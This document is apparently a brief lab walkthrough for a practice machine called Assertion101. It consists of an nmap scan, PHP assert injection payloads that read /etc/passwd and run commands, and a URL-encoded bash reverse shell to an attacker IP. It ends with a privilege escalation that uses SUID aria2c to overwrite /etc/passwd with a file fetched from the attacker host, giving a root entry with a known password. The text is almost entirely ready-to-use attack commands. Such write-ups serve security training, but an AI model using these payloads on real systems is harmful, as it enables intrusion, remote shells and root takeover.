# Assertion101

***

IP=192.168.192.94

## NMAP

| Port Number | Service |
| ----------- | ------- |
| 22          | SSH     |
| 80          | HTTP    |

```perl
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6eceaacc02dea5a3585dda2bef5407f9 (RSA)
|   256 9d3fdf167ae15958844ae3298f44878d (ECDSA)
|_  256 87b56ff82181d33b43d04081c0e36989 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Assertion
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## 80

### LFI via PHP's 'assert'

https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert

```bash
' and die(show_source('/etc/passwd')) or '
```

#### RCE via assert

```bash
' and die(system("whoami")) or '
```

#### Shell

```bash
'+and+die(system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.169/1234+0>%261'"))+or+'
```

## PrivEsc

### SUID aria2c

```bash
find / -perm -4000 2>/dev/null
```

```bash
openssl passwd
$1$x8g0v8Xh$O8BusfRSynJjM41.Gbqlh0
```

passwd

```bash
root:HHSomvHwFeyi2:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

```bash
aria2c -o /etc/passwd "http://192.168.45.169/passwd" --allow-overwrite=true
```
